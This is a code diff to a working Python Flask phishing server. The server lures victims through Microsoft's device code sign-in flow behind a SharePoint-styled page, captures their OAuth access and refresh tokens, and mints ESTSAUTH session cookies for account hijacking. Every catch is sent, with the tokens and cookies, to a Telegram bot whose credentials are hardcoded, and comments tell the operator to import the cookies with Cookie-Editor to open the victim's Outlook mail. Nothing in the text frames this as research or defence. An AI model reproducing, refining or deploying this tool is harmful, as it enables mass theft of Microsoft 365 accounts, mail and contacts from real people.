@@ -3,17 +3,22 @@ import json
 import time
 import base64
 import uuid
+import re
 import sqlite3
 import threading
 import signal
 import requests
 from flask import Flask, request, Response
 
+# ---------------------------------------
+# CONFIGURATION
+# ---------------------------------------
 UPSTREAM = "https://login.microsoftonline.com"
 TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
+# Client IDs pre-authorized for Graph Device Code Flow
 CLIENT_IDS = [
     "14d82eec-204b-4c2f-b7e8-296a70dab67e",  # Microsoft Graph Command Line Tools
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
@@ -21,9 +26,18 @@ CLIENT_IDS = [
 ]
 CLIENT_ID_INDEX = 0
 
-# Outlook resource ONLY — do not mix with graph.microsoft.com (causes AADSTS65002)
-DEVICE_CODE_SCOPE = "offline_access https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send"
+# Scopes targeting Graph API (Mail, Calendar, Contacts, User Profile)
+DEVICE_CODE_SCOPE = (
+    "https://graph.microsoft.com/Mail.ReadWrite "
+    "https://graph.microsoft.com/Mail.Send "
+    "https://graph.microsoft.com/MailboxSettings.ReadWrite "
+    "https://graph.microsoft.com/Calendars.ReadWrite "
+    "https://graph.microsoft.com/Contacts.ReadWrite "
+    "https://graph.microsoft.com/User.Read "
+    "offline_access openid profile"
+)
 
+# Cookies we want to harvest for persistent session hijacking
 COOKIE_WANTED = [
     "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
     "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
@@ -33,7 +47,9 @@ COOKIE_WANTED = [
 app = Flask(__name__)
 shutdown_event = threading.Event()
 
-# ---------- DB ----------
+# ---------------------------------------
+# DATABASE MANAGEMENT
+# ---------------------------------------
 def init_db():
     con = sqlite3.connect(DB_PATH)
     con.execute("""CREATE TABLE IF NOT EXISTS sessions (
@@ -49,19 +65,23 @@ def init_db():
         cookies TEXT,
         ts TEXT
     )""")
+    # Ensure cookies column exists for backward compatibility
     cols = [r[1] for r in con.execute("PRAGMA table_info(sessions)").fetchall()]
     if "cookies" not in cols:
         con.execute("ALTER TABLE sessions ADD COLUMN cookies TEXT")
     con.commit()
     con.close()
 
+# Initialize DB immediately on import
 init_db()
 
 def db_add_session(device_code, user_code, client_id, interval, expires_at):
     con = sqlite3.connect(DB_PATH)
-    con.execute("INSERT INTO sessions (device_code, user_code, client_id, interval, expires_at, status, ts) VALUES (?,?,?,?,?,?,?)",
-                (device_code, user_code, client_id, interval, expires_at, "pending",
-                 time.strftime("%Y-%m-%d %H:%M:%S")))
+    con.execute(
+        "INSERT INTO sessions (device_code, user_code, client_id, interval, expires_at, status, ts) VALUES (?,?,?,?,?,?,?)",
+        (device_code, user_code, client_id, interval, expires_at, "pending",
+         time.strftime("%Y-%m-%d %H:%M:%S"))
+    )
     sid = con.execute("SELECT last_insert_rowid()").fetchone()[0]
     con.commit()
     con.close()
@@ -69,7 +89,9 @@ def db_add_session(device_code, user_code, client_id, interval, expires_at):
 
 def db_pending_sessions():
     con = sqlite3.connect(DB_PATH)
-    rows = con.execute("SELECT id, device_code, client_id, interval, expires_at FROM sessions WHERE status='pending'").fetchall()
+    rows = con.execute(
+        "SELECT id, device_code, client_id, interval, expires_at FROM sessions WHERE status='pending'"
+    ).fetchall()
     con.close()
     return rows
 
@@ -80,9 +102,12 @@ def db_update_session(sid, **kw):
     con.commit()
     con.close()
 
-# ---------- Telegram ----------
+# ---------------------------------------
+# TELEGRAM NOTIFICATIONS
+# ---------------------------------------
 def send_telegram(text):
     try:
+        # Split long messages to avoid Telegram API limits
         while len(text) > 4000:
             chunk = text[:4000]
             cut = chunk.rfind("\n")
@@ -115,9 +140,12 @@ def send_telegram_file(filename, content, caption=""):
     except Exception as e:
         print("Telegram file error:", e)
 
-# ---------- Device code flow ----------
+# ---------------------------------------
+# DEVICE CODE FLOW
+# ---------------------------------------
 def request_device_code():
     global CLIENT_ID_INDEX
+    # Try each client ID until one works
     for _ in range(len(CLIENT_IDS)):
         client_id = CLIENT_IDS[CLIENT_ID_INDEX]
         try:
@@ -131,6 +159,7 @@ def request_device_code():
                 return client_id, data
             else:
                 print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
+                # Rotate to next client ID
                 CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
         except Exception as e:
             print(f"[SESSION] client_id {client_id} exception: {e}")
@@ -146,13 +175,21 @@ def decode_id_token(id_token):
     except Exception:
         return "unknown"
 
-# ---------- Cookie minting ----------
+# ---------------------------------------
+# COOKIE MINTING (SSO Round-Trip)
+# ---------------------------------------
 def get_victim_cookies(refresh_token, client_id, email):
+    """
+    Refreshes the token and performs an SSO authorize round-trip to mint
+    ESTSAUTH cookies. Handles form_post redirects manually.
+    """
     try:
         s = requests.Session()
         s.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
         })
+        
+        # Step 1: Refresh Token
         r = s.post(
             f"{UPSTREAM}/common/oauth2/v2.0/token",
             data={
@@ -168,31 +205,49 @@ def get_victim_cookies(refresh_token, client_id, email):
             print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
             return None
 
+        # Step 2: SSO Authorize (trigger cookie issuance)
         nonce = uuid.uuid4().hex
         auth_url = (
             f"{UPSTREAM}/common/oauth2/authorize?"
             f"client_id={client_id}&response_type=id_token"
             f"&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient"
             f"&scope=openid&response_mode=form_post&nonce={nonce}"
-            f"&login_hint={email}&prompt=none"
+            f"&login_hint={email}"
         )
-        s.get(auth_url, timeout=25, allow_redirects=True)
+        resp = s.get(auth_url, timeout=25, allow_redirects=True)
 
+        # Step 3: Follow form_post redirects manually
+        # Microsoft returns an HTML page with a form that auto-submits via JS.
+        # We parse and POST it ourselves.
+        for _ in range(5):  # Max 5 chained redirects
+            m = re.search(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
+                          resp.text, re.IGNORECASE | re.DOTALL)
+            if not m:
+                break
+            action = m.group(1).replace("&amp;", "&")
+            # Extract input fields
+            fields = dict(re.findall(
+                r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', m.group(2)))
+            resp = s.post(action, data=fields, timeout=25, allow_redirects=True)
+
+        # Extract desired cookies
         cookies = {}
         for c in s.cookies:
             if c.name in COOKIE_WANTED and c.value:
                 cookies[c.name] = c.value
+        
         if not cookies:
             print("[COOKIES] no wanted cookies captured")
             return None
-        print(f"[COOKIES] captured {len(cookies)} cookies")
+            
+        print(f"[COOKIES] captured {len(cookies)} cookies: {list(cookies.keys())}")
         return cookies
     except Exception as e:
         print(f"[COOKIES] exception: {e}")
         return None
 
 def format_cookies_text(cookies, email):
-    lines = [f"COOKIE SESSION - {email}", "Domain: login.microsoftonline.com", ""]
+    lines = [f" COOKIE SESSION - {email}", "Domain: login.microsoftonline.com", ""]
     for name, value in cookies.items():
         lines.append(f"{name}={value}")
     return "\n".join(lines)
@@ -211,16 +266,24 @@ def format_cookie_editor_json(cookies):
         })
     return json.dumps(out, indent=2)
 
-# ---------- Worker ----------
+# ---------------------------------------
+# POLLING WORKER
+# ---------------------------------------
 def poll_worker():
     print("[WORKER] poll_worker started")
     while not shutdown_event.is_set():
         try:
-            for sid, device_code, client_id, interval, expires_at in db_pending_sessions():
+            sessions = db_pending_sessions()
+            if not sessions:
+                shutdown_event.wait(timeout=5)
+                continue
+                
+            for sid, device_code, client_id, interval, expires_at in sessions:
                 if time.time() > expires_at:
                     db_update_session(sid, status="expired")
                     print(f"[WORKER] session {sid} expired")
                     continue
+
                 try:
                     resp = requests.post(
                         f"{UPSTREAM}/common/oauth2/v2.0/token",
@@ -243,15 +306,21 @@ def poll_worker():
                         "refresh_token": data.get("refresh_token"),
                         "id_token": data.get("id_token"),
                     }
+                    
+                    # Attempt to mint cookies
                     cookies = get_victim_cookies(tokens["refresh_token"], client_id, email)
-                    if cookies:
-                        db_update_session(sid, status="caught", email=email,
-                                          tokens=json.dumps(tokens), cookies=json.dumps(cookies))
-                    else:
-                        db_update_session(sid, status="caught", email=email,
-                                          tokens=json.dumps(tokens), cookies="{}")
+                    
+                    # Update DB
+                    db_update_session(
+                        sid, 
+                        status="caught", 
+                        email=email,
+                        tokens=json.dumps(tokens), 
+                        cookies=json.dumps(cookies) if cookies else "{}"
+                    )
 
-                    msg = (f"\U0001F3C6 New catch!\n"
+                    # Prepare Telegram Message
+                    msg = (f"🏆 New catch!\n"
                            f"Email: {email}\n"
                            f"Session: {sid}\n"
                            f"Access Token:\n{tokens['access_token']}\n\n"
@@ -259,13 +328,14 @@ def poll_worker():
                            f"ID Token:\n{tokens['id_token']}")
 
                     if cookies:
-                        msg += ("\n\n\u2705 SESSION COOKIES (domain login.microsoftonline.com):\n"
+                        msg += ("\n\n✅ SESSION COOKIES (domain login.microsoftonline.com):\n"
                                 + format_cookies_text(cookies, email))
-                        msg += ("\n\n\u2192 Paste into Cookie-Editor on login.microsoftonline.com, "
+                        msg += ("\n\n→ Paste into Cookie-Editor on login.microsoftonline.com, "
                                 "then open outlook.office.com/mail")
 
+                    # Send to Telegram
                     if len(msg) > 4000:
-                        send_telegram(f"\U0001F3C6 New catch! Email: {email} (tokens + cookies attached)")
+                        send_telegram(f"🏆 New catch! Email: {email} (tokens + cookies attached)")
                         send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Tokens for {email}")
                         if cookies:
                             send_telegram_file("cookies.json", format_cookie_editor_json(cookies),
@@ -277,8 +347,9 @@ def poll_worker():
                                                f"Cookie-Editor import for {email} -> login.microsoftonline.com")
 
                     print(f"[WORKER] session {sid} caught email={email} cookies={'yes' if cookies else 'no'}")
+                
                 elif data.get("error") == "authorization_pending":
-                    pass
+                    pass  # Wait for next poll
                 elif data.get("error") == "slow_down":
                     time.sleep(5)
                 elif data.get("error") == "expired_token":
@@ -287,11 +358,17 @@ def poll_worker():
                 elif data.get("error") in ("authorization_declined", "invalid_grant"):
                     db_update_session(sid, status="declined")
                     print(f"[WORKER] session {sid} declined")
+                
+                # Respect polling interval
+                shutdown_event.wait(timeout=interval)
+                
         except Exception as e:
             print(f"[WORKER] loop error: {e}")
-        shutdown_event.wait(timeout=3)
+            shutdown_event.wait(timeout=5)
+            
     print("[WORKER] poll_worker stopped")
 
+# Start worker thread safely
 _worker_started = False
 def start_worker():
     global _worker_started
@@ -308,7 +385,9 @@ def _shutdown(sig, frame):
 signal.signal(signal.SIGTERM, _shutdown)
 signal.signal(signal.SIGINT, _shutdown)
 
-# ---------- Page (SharePoint style) ----------
+# ---------------------------------------
+# PHISHING PAGE (SharePoint Theme)
+# ---------------------------------------
 def render_page(user_code, verify_url):
     return f"""<!DOCTYPE html>
 <html lang="en">
@@ -437,7 +516,9 @@ function go() {{
 </body>
 </html>"""
 
-# ---------- Routes ----------
+# ---------------------------------------
+# ROUTES
+# ---------------------------------------
 @app.route("/", methods=["GET"])
 def home():
     client_id, data = request_device_code()
